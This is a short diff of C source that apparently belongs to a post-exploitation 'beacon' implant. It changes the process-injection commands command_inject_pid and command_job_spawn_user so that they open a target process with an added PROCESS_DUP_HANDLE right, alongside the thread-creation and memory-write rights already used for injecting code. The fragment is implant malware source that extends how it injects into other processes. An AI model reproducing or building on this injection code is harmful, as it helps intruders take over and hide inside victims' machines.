@@ -36,7 +36,7 @@ void command_inject_pid(char * buffer, int length, BOOL x86) {
 	offset = data_int(&parser);
 
 	/* open the process for some oh so subtle manipulation */
-	hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+	hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
 	if (hProcess == NULL) {
 		post_error_dd(0x21, pid, GetLastError());
 		return;
@@ -422,7 +422,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 
 	/* explicit pid: inject into that process */
 	if (pid > 0) {
-		hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+		hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
 		if (hProcess == NULL) {
 			post_error_dd(0x21, pid, GetLastError());
 			return;
